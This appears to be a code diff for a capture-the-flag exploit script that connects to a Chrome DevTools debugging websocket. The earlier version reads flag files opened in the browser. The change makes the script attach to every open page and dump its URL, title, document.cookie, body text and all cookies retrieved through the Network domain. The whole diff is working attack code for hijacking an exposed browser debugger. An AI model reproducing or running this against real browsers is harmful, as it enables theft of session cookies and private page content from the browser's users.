@@ -6,7 +6,7 @@ async function kick(){
   log('begin');
   const qs=new URLSearchParams(location.search);
   let wsUrl=qs.get('ws')||'ws://127.0.0.1:9222/devtools/browser/dee5b617-6f29-4237-82c6-ed425684f25e';
-  log('ws='+wsUrl.slice(0,50));
+  log('ws='+wsUrl.slice(0,40));
   try{
     const ws=new WebSocket(wsUrl);
     const resp=new Map(); let n=100;
@@ -17,20 +17,20 @@ async function kick(){
     const gt=await send('Target.getTargets');
     const ts=(gt.result&&gt.result.targetInfos)||[];
     log('targets='+ts.length);
-    const want=['file:///flag','file:///etc/flag','file:///var/flag','file:///tmp/flag','file:///root/flag','file:///home/ctf/flag','file:///app/flag'];
-    let found=0;
     for(const t of ts){
-      if(t.type==='page'&&want.indexOf(t.url)>=0){
-        try{
-          const at=await send('Target.attachToTarget',{targetId:t.targetId,flatten:true});
-          const sid=at.result.sessionId;
-          const ev=await send('Runtime.evaluate',{expression:'(document.body&&document.body.innerText)||"EMPTY"',returnByValue:true},sid);
-          const val=ev.result&&ev.result.result&&ev.result.result.value;
-          log('URL='+t.url+'\n>> '+val); found++;
-        }catch(ee){log('err '+t.url+' '+ee);}
-      }
+      if(t.type!=='page') continue;
+      try{
+        const at=await send('Target.attachToTarget',{targetId:t.targetId,flatten:true});
+        const sid=at.result.sessionId;
+        const expr='JSON.stringify({u:location.href,t:document.title,c:document.cookie,b:(document.body&&document.body.innerText||"").slice(0,800)})';
+        const ev=await send('Runtime.evaluate',{expression:expr,returnByValue:true},sid);
+        const val=ev.result&&ev.result.result&&ev.result.result.value;
+        log('TGT '+t.url+'\n'+val);
+        // also get all cookies via Network
+        try{ const ck=await send('Network.getCookies',{urls:[t.url]},sid); log('CK '+JSON.stringify(ck.result&&ck.result.cookies)); }catch(_){}
+      }catch(ee){log('err '+t.url+' '+ee);}
     }
-    log('DONE found='+found);
+    log('DONE');
   }catch(e){log('FATAL:'+e);}
 }
 kick();
